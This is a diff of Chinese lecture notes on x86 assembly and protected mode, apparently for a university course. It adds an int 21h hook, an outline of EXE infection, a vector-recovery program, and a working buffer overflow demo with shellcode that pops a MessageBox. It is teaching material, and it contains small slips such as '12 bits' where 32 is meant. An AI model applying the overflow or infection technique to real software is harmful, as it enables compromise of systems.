@@ -215,7 +215,7 @@ final_step:
 
 ---
 
-- TF: trap flag，控制单步模式，一条指令执行前 TF = 1 ，CPU 在指令后面加一句 `int 1h`
+- TF: trap flag，控制单步模式，**一条指令执行前 TF = 1 ，CPU 在指令后面加一句 `int 1h`**（注意一定要在指令执行前 TF = 1，如果是指令结束后 TF 才设成 1，那他后面就不会插入 int 1h）
     - `dword ptr 0:[4]` 存储了 `int 1h` 函数的地址，高 16 位是段地址，低 16 位是偏移地址（中断 `int x` 存放在 `0:[4 * x]` 处）（注意是小端模式存储）
 - 相关指令：没有专门的指令，使用 pushf, popf，对 flag 整体进行操作
 
@@ -269,22 +269,21 @@ my_int_1h:
 - ds=es=psp段址
 
 其中 **psp 段址** 是：长度为 100h 的一块内存，位于程序首段之前，其内容与程序内容无关，存放与 exe 相关的信息
-- 命令行参数：`psp:80h` 一个字节存命令行参数的长度，从 `psp:81h` 开始连续存放命令行参数的字符
+
+- `psp:80h` 一个字节存命令行参数的长度，从 `psp:81h` 开始连续存放命令行参数的字符
     - 如果程序名后面打了空格，那空格也会在参数字符串里
     - 参数字符串以回车结尾
+- `psp:14h` 一个 dword 存放远指针，表示程序开始运行的地址相对于程序开头（不包括 psp，一般是 data 段）的偏移地址。例如 `0001:0000` 表示，如果 data 段是 `0020:0000`，则程序开始运行的地址就是 `0021:0000`
+- `psp:02h` 是一个 dword 存放 exe 文件的长度（单位：字节）
 
 **tips.**
 
 1. 进行逻辑地址寻址之前 ds 一定要自己赋值
 1. ds 初始值加 100h 等于程序首段段地址
 
-#### 32 位寄存器
+#### 32 位保护模式
 
-保持 16 位：cs, ds, es, ss
-
-扩展到 12 位：eax, ebx, ecx, edx, esi, edi, ebp, esp, eip, EFL
-
-#### 保护模式
+##### 32 位寄存器
 
 16 位 CPU 运行在实模式(real mode)下，用户代码具有和操作系统一样的权限。
 
@@ -295,7 +294,9 @@ my_int_1h:
 - 保持 16 位：cs, ds, es, ss
 - 扩展到 12 位：eax, ebx, ecx, edx, esi, edi, ebp, esp, eip, EFL
 
-gdt(global descriptor table): 全局描述符表。数组，每个元素 8 Byte
+##### gdt
+
+gdt(global descriptor table): 全局描述符表。数组，每个元素 8 Byte。
 
 ```
 t     -> gdt[0]
@@ -304,9 +305,13 @@ t+10h -> gdt[2]
 t+18h -> gdt[3]
 ```
 
+当我们为 ds, es, ss, cs 进行赋值时，必须要为他们建立对应的段描述符
+
+---
+
 现在假设这么一个情形：ds = 8, edi = 45678h，在内存中指向的地址是什么？
 
-假设 gdt[1] 的 8 个字节如下：
+首先 `ds=8` 表示 ds 相关的信息存在 gdt[1] 中，假设 gdt[1] 的 8 个字节如下：
 
 | 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  |
 | -- | -- | -- | -- | -- | -- | -- | -- |
@@ -316,17 +321,176 @@ t+18h -> gdt[3]
 
 `00100000h + 45678h = 00145678h`
 
+---
+
 取出第 6 Byte 的低 4 位，加上 1 和 0 Byte，组成段的最大偏移地址 `FFFFFh`
 
-第 6 Byte 的最高 bit 如果为 0，表示最大偏移量的单位是 bit；如果为 1，表示单位是 Page( = 4K)
+第 6 Byte 的最高 bit 如果为 0，表示最大偏移量的单位是 Byte；如果为 1，表示单位是 Page( = 4K)(=1000h Byte)。
 
-第 5 Byte 用来规定段的类型、读写权限。例如 93h 表示：该段是数据段、可读、可写、要求访问者的权限是 ring0（最高权限级）
+增加了粒度（Byte 和 Page）之后，一个页可访问的最大页号为 `FFFFFh`，这个页的地址范围为 `FFFFF000h ~ FFFFFFFFh`，即可以用一个页包含整个内存
 
-假设这是第 5 个 Byte 的数据，第 1 和 2 位规定了权限(ring0)
+---
 
-| 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  |
+1. 第 6 Byte 的第 6 bit 称为 D 位
+    1. D=1 表示使用 32 位偏移地址
+    1. D=0 表示使用 16 位偏移地址
+1. 第 6 Byte 的第 5 bit 表示使用 64 位偏移地址
+1. 第 6 Byte 的第 4 bit 是保留给用户的位
+
+---
+
+第 5 Byte 用来规定段的类型、读写权限：
+
+1. 第 5 Byte 的第 7 bit 是 P(present)，表示当前这个段对应的内存是存在的，如果是虚拟内存 P 就是 0
+1. 第 5 Byte 的第 6 和 5 bit 是 DPL(Descriptor's Privilege Level)，用来规定谁可以访问本段。例如当 DPL=00h 表示只有 ring0 的进程可以访问本段而当 DPL=11h 时表示任何进程都可以访问本段
+    - 00 是最高级别
+    - 11 是最低级别
+1. 第 5 Byte 的第 4 bit 是 S
+    - S＝1 时表示这是一个代码段或数据段描述符
+    - S＝0 时表示这是一个系统描述符如 call gate、interrupt gate、task gate 等
+1. 第 5 Byte 的第 3 bit 是 C/D
+    - C/D=1 表示这是一个代码段
+    - C/D=0 表示这是一个数据段
+1. 第 5 Byte 的第 2 bit 是 E/C(Expand-down/Conforming)
+    - 当 C/D=0 时(数据段), E/C=1 表示这是一个expand-down数据段, 在这种情形下，limit 的含义变成最大不可访问偏移地址, 如 limit=0FFh 且假定这是一个 16 位段(+6 字节的 G=0 且 D=0 )，那么该段可访问的偏移地址范围为[100h, 0FFFFh];
+    - 当C/D=1时(代码段), E/C=1表示这是一个conforming代码段, 在这种情形下,ring3 进程通过 call far ptr 指令调用该段内的函数时(假设DPL=0)，CPL将仍旧保持3不会变成0。
+1. 第 5 Byte 的第 1 bit 是 R/W
+    - R/W=1 表示可读代码段或可写数据段
+    - R/W=0 表示不可读代码段或不可写数据段（数据段一定可读，代码段一定可执行且不可写）
+1. 第 5 Byte 的第 0 bit 是 A(accessed)
+    - A=1表示该段被访问过
+    - A=0表示该段没被访问过
+
+例如 93h 表示：该段是数据段、可读、可写、要求访问者的权限是 ring0（最高权限级）
+
+| 7  | 6  | 5  | 4  | 3  | 2  | 1  | 0  |
 | -- | -- | -- | -- | -- | -- | -- | -- |
 | 1 | 0 | 0 | 1 | 0 | 0 | 1 | 1 |
+| P | DPL(1) | DPL(0) | S | C/D | E/C | R/W | A |
+
+##### 进程权限 CPL
+
+进程的权限由 CPL(current privilege level) 决定, CPL位于当前进程 CS 及 SS 的低2位（cs 和 ss 的低 2 位一定是相等的）
+
+比如 `cs = 18h = 0001_1000b`，CPL = 0 表示当前进程的权限是 ring0
+
+比如 `cs = 1Bh = 0001_1011b`，CPL = 3 表示当前进程的权限是 ring3
+
+只能做相同 ring 级别的跳转，不能从 ring0 跳到 ring3，也不能从 ring3 跳到 ring0
+
+段 selector 和 gdt 地址相加之前，会先清零低 3 位，所以 CPL RPL 之类不影响 selector 的寻址。
+
+##### 申请访问权限 RPL
+
+RPL 就是 Request Privilege Level
+
+```asm
+mov ax, 28h; 0010 1000
+           ;        ==
+           ;        RPL=0
+mov ds, ax ; AX中的低2位称为RPL
+```
+
+当 cpu 执行上述指令（给段寄存器赋值）时, 它会做以下 2 步权限检查:
+1. 若 `ax.RPL > 28h->descriptor.DPL` 则产生异常，否则做步骤(2)
+    - 查看提出申请的进程是否有权限访问内存
+1. 若 `cs.CPL > 28h->descriptor.DPL` 则产生异常，否则正常执行 `mov ds, ax` 指令
+    - 检查当前进程是否有权限访问内存
+
+---
+
+举个例子，假定gdt的内容如下:
+
+```asm
+gdt db 8 dup(0) ; +0
+    db ...      ; +8
+    db ...      ; +10h
+    db ...      ; +18h
+    db ...      ; +20h
+    db 0FFh,0FFh,78h,56h,34h,93h,40h,12h; +28h
+                             ~~~
+                             1001 0011
+                              ==
+                              DPL=0
+```
+
+则 gdt+28h 指向的描述符的 DPL=0, 这就意味着当某个进程要把 28h 赋值给寄存器ds时, 该进程的 CS 的低 2 位即CPL必须等于 0, 同时用来赋值给 ds 的寄存器(如AX)的低 2 位即 RPL 也必须等于 0。
+
+以下代码可以执行：
+
+```asm
+18h:0000   mov ax, 28h; AX.RPL=0, CS.CPL=0
+18h:0003   mov ds, ax ; DS的值不再像实模式那样叫段地址,而是称为selector
+                      ; DS指向的描述符的地址=
+                      ; gdt + ds
+```
+
+---
+
+若gdt+28h指向的描述符改成以下内容:
+
+```asm
+gdt db 8 dup(0) ; +0
+    db ...      ; +8
+    db ...      ; +10h
+    db ...      ; +18h
+    db ...      ; +20h
+    db 0FFh,0FFh,78h,56h,34h,0F3h,40h,12h; +28h
+                             ~~~~
+                             1111 0011
+                              ==
+                              DPL=3
+```
+
+则gdt+28h指向的描述符的DPL=3, 这就意味着当某个进程要把28h赋值给寄存器ds时, 该进程的CS的低2位即CPL可以是任意值, 同时用来赋值给ds的寄存器(如AX)的低2位，即RPL也可以是任意值
+
+以下代码可以执行：
+
+```asm
+1Bh:0000   mov ax, 2Bh; AX.RPL=3, CS.CPL=3
+1Bh:0003   mov ds, ax ; 此时ds指向的描述符的地址=
+                      ; gdt + (ds & 0xFFF8h)
+```
+
+---
+
+为什么要设置两重权限检查？考虑下面这种情形
+
+假定f0()是ring0权限的函数，f3()是ring3权限的函数，当f3通过调用门调用f0()时，
+f3()利用arpl指令可以成功阻止f3()通过调用f0()越权访问v指向的段:
+
+> 再简单描述一下，就是如果仅有第二句检查，则低权限函数本来无法访问某块内存，但是通过调用高权限函数可以访问原来访问不了的内存。
+
+```asm
+f0:
+   push ebp
+   mov ebp, esp
+   mov cx, [ebp+8]    ; CX=CS=1Bh
+                      ; cx 存 CPL
+   mov ax, [ebp+10h]  ; AX=offset v=08h
+                      ; ax 存 RPL
+   arpl ax, cx        ; 当cx.CPL>ax.RPL时, ax.RPL=cx.CPL, 故AX=0Bh
+   mov es, ax         ; 执行这条语句时会发生异常(即CPU能成功检测到f3不能访问DPL=0的段)
+                      ; 因为ax.RPL > (ax & 0xFFF8)->descriptor.DPL
+   mov ebx, [ebp+0Ch]
+   mov al, 'P'
+   mov ah, 47h   
+   mov es:[ebx], ax
+   pop ebp
+   retf 8
+
+f3:                 ; 设f3的地址为1Bh:00000000h
+   mov eax, offset v; 设offset v=8, offset v指向的描述符的DPL=0
+   push eax         ; v  db 0FFh, 0FFh,  00h,  80h,  0Ah,  93h,  0Fh,  00h
+                    ; EAX是传递给f0()的selector
+   mov eax, 10000h  ; 
+   push eax         ; EAX是传递给f0()的32位偏移地址
+   db 09Ah     ; call far ptr cg:00000000
+   dd 0        ; 其中cg是调用门的selector, cg指向的调用门描述符中规定了
+   dw offset cg; call的目标地址为f0
+back:
+```
+
 
 #### 32 位间接寻址方式
 
@@ -1760,6 +1924,7 @@ Bochs 虚拟机内置的调试器
 1. F5：print user screen
 1. F8：执行一条指令
 1. 在命令窗口中输入 `D cs:0` 在数据窗口中显示指定位置的数据（大小写不敏感）
+    - 在调试 C 源代码编译出的 exe 时，`d key` 可以直接查看变量内容
 1. 在命令窗口中输入 `bpmb 5386:3 w` 在指定位置设置硬件断点
     - 如果被调试程序执行了写指令，则会唤起 soft-ICE，并显示造成中断的写指令
 1. 在命令窗口中输入 `BL` 查看已经设置的硬件断点
@@ -1786,6 +1951,11 @@ tips：soft-ICE 如何实现硬件断点？因为 bochs 是解释型的，所以
 1. `wc 8`, `wd 4` 调节代码窗口、数据窗口的长度
 1. 在命令窗口中输入 `cls` 清除命令窗口屏幕
 1. 上下箭头：调取指令历史记录
+1. `.` 回到当前 ip 位置
+1. `src` 切换模式
+    - 源程序模式
+    - 汇编模式
+    - 源程序 + 汇编混合模式
 
 ### Visual C++
 
@@ -3300,8 +3470,8 @@ main:
    ;
    mov ax, 1234h
    mov dh, 0
-;int 00h
 here:
+    ;int 00h
    div dh               ; 做一个除 0 的除法
                         ; 在执行 div 指令之前会触发 int 00h 中断
 next:
@@ -3478,6 +3648,101 @@ end main
 ```
 
 [TODO] 理解代码功能
+
+#### 自定义显示字符串的函数 int 21h(AH=9)
+
+在中断函数中调用中断函数的两种写法：
+
+1. `jmp dword ptr cs:[old_21h]` old 21h 返回之后直接回到原程序代码处继续执行
+1. `pushf`+ `call dword ptr cs:[old_21h]` old 21h 返回之后回到自定义 int 21h 中继续执行
+
+程序功能：所有通过 int 21h(AH=9) 输出的字符串，都会变成全大写
+
+```asm
+code segment
+assume cs:code, ds:code
+int_21h:
+    cmp ah, 9
+    je is_write_string_function
+    jmp dword ptr cs:[old_21h] ; jmp 了之后就不会再回到 int_21h 了，直接返回原程序
+is_write_string_function:
+    push ax
+    push bx
+    push dx
+    mov bx, dx; ds:bx->string to output
+output_next_char:
+    mov dl, [bx]
+    cmp dl, '$'
+    je end_of_string
+    cmp dl, 'a'
+    jb not_lowercase
+    cmp dl, 'z'
+    ja not_lowercase
+    sub dl, 20h; convert lowercase to uppercase
+not_lowercase:
+    mov ah, 2
+    pushf
+    call dword ptr cs:[old_21h]; Use pushf & call to emulate int 21h
+                               ; so that we can output one char inside int_21h.
+                               ; 这句话直接跳到原来的 int 21h 中断函数，不会进入自定义的 int 21h 形成递归
+    inc bx
+    jmp output_next_char
+end_of_string:
+    pop dx
+    pop bx
+    pop ax
+    iret
+old_21h dw 0, 0
+main:
+    push cs
+    pop ds ; DS=CS
+    xor ax, ax
+    mov es, ax
+    mov bx, 21h*4; ES:BX-> int_21h's vector
+    push es:[bx]
+    pop old_21h[0]
+    push es:[bx+2]
+    pop old_21h[2]; save old vector of int_21h
+
+    cli    ; disable interrupt when changing int_21h's vector
+    mov word ptr es:[bx], offset int_21h
+    mov es:[bx+2], cs
+    sti    ; enable interrupt
+    ;-------------------------
+install:
+    mov ah,9
+    mov dx,offset install_msg
+    int 21h ; 输出提示字符串
+    mov dx,offset main  ; DX=len for keeping resident
+                        ; main 之前的所有程序都驻留
+    add dx,100h         ; include PSP's len
+    add dx,0Fh          ; include remnant bytes，手动向上取整
+    mov cl,4
+    shr dx,cl           ; DX=program's paragraph size to keep resident
+    mov ah,31h
+    int 21h   ; keep resident
+install_msg db "The program hooks int 21h's vector and affects the behavior of int 21h/AH=09h.",0Dh,0Ah
+            db "Copyright Black White. Nov 20,2020",0Dh,0Ah,'$'
+code ends
+end main
+```
+
+#### 自定义 int 21h(AH=4Bh) 实现感染 exe
+
+需要用到的知识：
+
+1. int 21h(AH=4Bh) 会运行 `ds:dx` 指向的 exe
+2. psp 相关知识
+
+**psp 段址** 是：长度为 100h 的一块内存，位于程序首段之前，其内容与程序内容无关，存放与 exe 相关的信息
+
+- `psp:14h` 一个 dword 存放远指针，表示程序开始运行的地址相对于程序开头（不包括 psp，一般是 data 段）的偏移地址。例如 `0001:0000` 表示，如果 data 段是 `0020:0000`，则程序开始运行的地址就是 `0021:0000`
+- `psp:02h` 是一个 dword 存放 exe 文件的长度（单位：字节）
+
+感染的操作是：
+
+1. 在程序末尾写入 virus 代码，并在 virus 结尾 jmp 回原程序开头（通过 `psp:14h` 知道）
+1. 修改 `psp:14h` 和 `psp:02h` 使得程序从 virus 开始运行
 
 ### 代码复制 movcode.asm & printf.c
 
@@ -3962,4 +4227,370 @@ code ends
 end initialize
 ;==============源程序结束========================
 
+```
+
+### 病毒和杀毒
+
+第一段代码：修改 int 21h 的中断向量，并驻留在内存中，使得每次中断都会调用病毒代码
+
+```asm
+code segment
+assume cs:code, ds:code
+int_21h:
+    cmp ah, 9
+    je is_write_string_function
+    jmp dword ptr cs:[old_21h]
+is_write_string_function:
+    push ax
+    push bx
+    push dx
+    mov bx, dx; ds:bx->string to output
+output_next_char:
+    mov dl, [bx]
+    cmp dl, '$'
+    je end_of_string
+    cmp dl, 'a'
+    jb not_lowercase
+    cmp dl, 'z'
+    ja not_lowercase
+    sub dl, 20h; convert lowercase to uppercase
+not_lowercase:
+    mov ah, 2
+    pushf
+    call dword ptr cs:[old_21h]; Use pushf & call to emulate int 21h
+                               ; so that we can output one char inside int_21h.
+    inc bx
+    jmp output_next_char
+end_of_string:
+    pop dx
+    pop bx
+    pop ax
+    iret
+old_21h dw 0, 0
+main:
+    push cs
+    pop ds ; DS=CS
+    xor ax, ax
+    mov es, ax
+    mov bx, 21h*4; ES:BX-> int_21h's vector
+    push es:[bx]
+    pop old_21h[0]
+    push es:[bx+2]
+    pop old_21h[2]; save old vector of int_21h
+
+    cli    ; disable interrupt when changing int_21h's vector
+    mov word ptr es:[bx], offset int_21h
+    mov es:[bx+2], cs
+    sti    ; enable interrupt
+    ;-------------------------
+install:
+    mov ah,9
+    mov dx,offset install_msg
+    int 21h
+    mov dx,offset main; DX=len for keeping resident
+    add dx,100h; include PSP's len
+    add dx,0Fh; include remnant bytes
+    mov cl,4
+    shr dx,cl ; DX=program's paragraph size to keep resident
+    mov ah,31h; 1 paragraph = 10h×Ö½Ú
+    int 21h   ; keep resident
+install_msg db "The program hooks int 21h's vector and affects the behavior of int 21h/AH=09h.",0Dh,0Ah
+            db "Copyright Black White. Nov 20,2020",0Dh,0Ah,'$'
+code ends
+end main
+```
+
+第二段代码：（单步中断实现自动调试）
+
+1. 把运行模式转成单步模式，即把 TF 设置成 1，并且把 int 1h 改成自定义的函数
+1. 然后主动进入病毒的 int 21h 函数
+1. 因为调成了单步模式，所以每运行一句都会检查引发 int 1h 的语句地址，如果段地址 <= 550h 则判定其进入了原始的 int 21h 函数，将其值重新写回中断向量中
+
+```asm
+code segment
+assume cs:code, ds:code
+old_01h dw 0, 0
+old_21h dw 0, 0
+prompt db "This program will use the single-step technique to recover int 21h's vector.", 0Dh, 0Ah
+       db "Copyright (C) Black White. Nov 20, 2020.", 0Dh, 0Ah, '$'
+recover_msg db "int 21h's vector is recovered!", 0Dh, 0Ah, '$'
+int_01h:
+    push bp
+    mov bp, sp
+    cmp word ptr [bp+4], 550h; check whether the traced instruction's segment address <= 550h
+    ja skip
+store_the_original_int_21h_vector:
+    push [bp+2]
+    pop cs:old_21h[0]
+    push [bp+4]
+    pop cs:old_21h[2]
+    and word ptr [bp+6], not 0100h; clear TF
+skip:
+    pop bp
+    iret
+main:
+    push cs
+    pop ds; DS=CS=code
+    mov ah, 9
+    mov dx, offset prompt
+    int 21h
+    xor ax, ax
+    mov es, ax
+    push es:[1*4]
+    pop cs:old_01h[0]; save int 01h's vector
+    push es:[1*4+2]
+    pop cs:old_01h[2]
+    cli
+    mov word ptr es:[1*4], offset int_01h
+    mov word ptr es:[1*4+2], cs; change int 01h's vector
+    sti
+    pushf
+    push cs
+    mov di, offset here
+    push di; use 3 pushes to prepare for emulating int 21h
+    mov ah, 30h; pretend to call int 21h/AH=30h
+    pushf
+    pop dx; DX=FL
+    or dx, 100h
+    push dx
+    popf; TF=1
+        ; popf 之后并不会插入 int 1h
+        ; 第一句 int 1h 插入在 jmp 之后
+    jmp dword ptr es:[21h*4]; emulate int 21h/AH=30h
+                            ; NOTE: After executing this jmp, there will be 
+                            ; an int 01h before the 1st instruction of int 21h
+here:
+    cli
+    push cs:old_21h[0]
+    pop es:[21h*4]
+    push cs:old_21h[2]
+    pop es:[21h*4+2]  ; recover int 21h's vector
+    push cs:old_01h[0]
+    pop es:[1*4]
+    push cs:old_01h[2]
+    pop es:[1*4+2]    ; recover int 01h's vector
+    sti
+    mov ah, 9
+    mov dx, offset recover_msg
+    int 21h
+    mov ah, 4Ch
+    int 21h
+code ends
+end main
+```
+
+### 通过缓冲溢出实现植入代码 overflow.cpp
+
+XP 系统中 `7FFA:4512` 地址属于操作系统，并且存放着一条指令 `jmp esp`。
+
+进入 `len` 函数，会对堆栈进行如下操作，strcpy 会依次
+
+1. 写满局部变量 `t[4]` 为 `0x90,0x90,0x90,0x90`
+1. 然后覆盖 old ebp 为 `0x90,0x90,0x90,0x90`
+1. 覆盖函数返回地址为 `0x12,0x45,0xFA,0x7F`
+1. 覆盖函数参数
+1. 然后覆盖后续的栈空间为我们想让程序执行的代码
+
+```asm
+    push ebp
+    mov ebp, esp
+    sub esp, 4
+    ;ebp-4 -> t[0]       0x90,0x90,0x90,0x90
+    ;ebp+0 -> old ebp    0x90,0x90,0x90,0x90
+    ;ebp+4 -> ·µ»ØµØÖ·   0x12,0x45,0xFA,0x7F
+    ;                    +7FFA4512 -> jmp esp
+    ;ebp+8 -> p          0x89,0xE5,0x31,0xC0
+    ...
+    mov esp, ebp
+    pop ebp
+    ret
+```
+
+然后函数返回之后就会跳到 `7FFA:4512`，再跳到 `ss:esp`，即刚刚覆盖为我们想让程序执行的代码的空间，实现控制原程序的目的。
+
+```cpp
+#include "stdafx.h"
+#include <windows.h>
+#include <string.h>
+
+int len(char *p)
+{
+   char t[4];
+   strcpy(t, p);
+   return strlen(t);
+}
+
+int main()
+{
+   char over[] = 
+   {
+      0x90,0x90,0x90,0x90,
+      0x90,0x90,0x90,0x90,     
+      0x12,0x45,0xFA,0x7F,
+      0x89,0xE5,0x31,0xC0,0x50,0x8D,0x45,0x20,
+      0x50,0x30,0xD2,0x88,0x50,0x0F,0x8D,0x45,
+      0x30,0x88,0x50,0x0F,0x50,0x31,0xC0,0x50,
+      0xB8,0xEA,0x07,0xD5,0x77,0xFF,0xD0,0xC3,
+      0x4D,0x65,0x73,0x73,0x61,0x67,0x65,0x42,
+      0x6F,0x78,0x54,0x69,0x74,0x6C,0x65,0x21,
+      0x42,0x75,0x66,0x66,0x65,0x72,0x20,0x4F,
+      0x76,0x65,0x72,0x66,0x6C,0x6F,0x77,0x21,
+      0x00
+   };
+   int y;
+   MessageBox(NULL, "Test", "Begin", MB_OK);
+   y = len(over);
+here:
+	return 0;
+}
+```
+
+
+### 保护模式示例代码 p0.asm
+
+进入保护模式需要两个步骤。
+
+第一步，`lgdt fword ptr [gdtr]` 让程序知道 gdt 表定义在哪里，使用保护模式之前必须要加这句话。
+
+其中 gdtr 是一个 48 位的变量
+
+- 低 16 位是 gdt 的 limit
+- 高 32 位是 gdt 的首地址
+
+---
+
+第二步，启用保护模式：
+
+```asm
+   mov eax, cr0; CR0的bit0称为PE位
+   or eax, 1   ; 表示Protection Enable
+   mov cr0, eax; CPU进入了保护模式
+```
+
+其中 cr0 是一个权限寄存器
+
+---
+
+编译命令：
+
+1. `tasm p1;`
+1. `tlink /3 p1;`
+
+```asm
+;====================================================
+;copyright (c) Black White, June 15, 2023.
+;email: iceman@zju.edu.cn
+;
+;This program is for teaching purpose only, and     
+;it can ONLY be shared within Zhejiang University.  
+;Everyone at ZJU who has downloaded this program    
+;is NOT allowed to upload it to internet & CC98     
+;without my permission.                            
+;====================================================
+.386P
+data segment use16
+gdt label byte
+   db 8 dup(0)
+   ;   +0    +1    +2    +3    +4    +5    +6    +7 
+v  db 0FFh, 0FFh,  00h,  80h,  0Ah,  93h,  0Fh,  00h
+p  db  00h,  00h,  00h,  00h,  00h,  9Bh,  40h,  00h
+c  db 0FFh, 0FFh,  00h,  00h,  00h,  9Bh,  00h,  00h
+end_of_gdt label byte
+gdtr dw 0
+     dd 0
+data ends
+
+protect segment use32
+assume cs:protect
+f:
+   mov ax, offset v
+   mov es, ax
+   mov ebx, 10000h
+   mov al, 'P'
+   mov ah, 47h   
+   mov es:[ebx], ax
+   ;
+   db 66h
+   db 0EAh
+   dw offset back
+   dw offset c
+end_of_f:
+protect ends
+
+code segment use16
+assume cs:code, ds:data
+main:
+   ;Bochs config: port_e9_hack: enabled=1
+   ;to insert a breakpoint here
+   ; 这些语句告诉 bochs 调试器这里需要插入断点，所以直接在 bochs 中运行程序也会在这里停住
+   mov dx, 8A00h
+   mov ax, 8A00h
+   out dx, ax
+   mov ax, 8AE0h
+   out dx, ax
+   ; 现在还没有进入保护模式
+   mov ax, data
+   mov ds, ax
+   ; 接下来要把 protect 段的 gdt 信息写到 ds:p 中
+   ; 首先计算 limit
+   xor ebx, ebx
+   mov bx, offset end_of_f - offset f   ; protect 段的总长度
+   dec ebx                              ; 总长度-1 = 最大偏移地址 = limit
+   mov word ptr p[0], bx                ; 低 2 Byte 写到 p[0] 和 p[1]
+   shr ebx, 10h
+   and p[6], 0F0h
+   or  p[6], bl                         ; 高 0.5 Byte 写到 p[6] 的低 4 位
+   ; 然后处理段首地址
+   mov bx, protect
+   shl ebx, 4                           ; 段地址 * 10h 就是段首的物理地址
+   mov word ptr p[2], bx                ; 段首物理地址低 16 位写到 p[2] & p[3]
+   shr ebx, 10h
+   mov p[4], bl                         ; 段首物理地址 16 ~ 23 位写到 p[4]
+   mov p[7], bh                         ; 段首物理地址 24 ~ 31 位写到 p[7]
+   ; 同理把 code 段的 gdt 信息写到 ds:c 中
+   xor ebx, ebx
+   mov bx, code
+   shl ebx, 4
+   mov word ptr c[2], bx
+   shr ebx, 10h
+   mov c[4], bl
+   mov c[7], bh
+   ; 然后设置 gdtr
+   xor ebx, ebx
+   mov bx, data
+   shl ebx, 4  ; EBX=data*10h
+               ; 把段地址转化成 16 bit 的物理地址
+   mov dword ptr gdtr[2], ebx
+   mov bx, offset end_of_gdt
+   dec bx
+   mov gdtr[0], bx
+   ;
+   cli
+   ; 
+   lgdt fword ptr [gdtr]; 对48位的gdtr寄存器赋值
+                        ; 低16位是gdt的limit
+                        ; 高32位是gdt的首地址
+   ;
+   mov eax, cr0; CR0的bit0称为PE位
+   or eax, 1   ; 表示Protection Enable
+   mov cr0, eax; CPU进入了保护模式
+   ;
+   db 66h      ; 在16位状态下执行目标地址为48位远指针的远跳
+   db 0EAh     ; jmp far ptr 机器码
+   dd 0        ; 32位偏移地址
+   dw offset p ; 16位段地址(selector)
+back:
+   mov eax, cr0
+   and eax, not 1
+   mov cr0, eax
+   db 0EAh
+   dw offset real
+   dw code
+   ;
+   sti
+real:
+   mov ah, 4Ch
+   int 21h
+code ends
+end main
 ```
